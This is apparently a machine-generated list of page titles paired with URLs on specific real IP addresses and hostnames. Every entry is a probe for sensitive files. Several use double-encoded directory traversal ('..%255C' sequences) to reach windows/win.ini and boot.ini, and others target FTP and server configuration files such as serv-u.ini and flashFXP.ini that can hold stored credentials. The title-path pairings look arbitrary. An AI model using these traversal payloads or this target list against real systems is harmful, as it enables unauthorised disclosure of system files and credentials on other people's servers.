Untitled,http://lastrada.al/demo/0//..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255Cwindows/win.ini
open-xchange,http://61-64-230-163-adsl-tpe.dynamic.so-net.net.tw/comments/default.asp/php.ini
TUTOS,http://61-64-230-186-adsl-tpe.dynamic.so-net.net.tw/login/suse/pls/perform.ini
start.managing.the.device - switch login,http://203.105.229.159/login/ventrilo_srv.ini
SFXAdmin - sfx_global,http://210.242.147.163/login/..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255Cboot.ini
switch login - Belarc Advisor Current Profile,http://103.225.3.157/login/gs/printer/preferences.ini
"Zope - \""System",http://210.242.146.167/login/install/serv-u.ini
"Login to @Mail - \""Big",http://210.242.148.164/login/perl/default.asp/preferences.ini
iVISTA.Main.Page - Metaframe XP Login,http://222.156.247.164/login/log/printer/flashFXP.ini
Supero - Execution of this s?ri?t not permitted,http://61.62.173.181/login/smccd.edu/disclaimer/flashfxp.ini
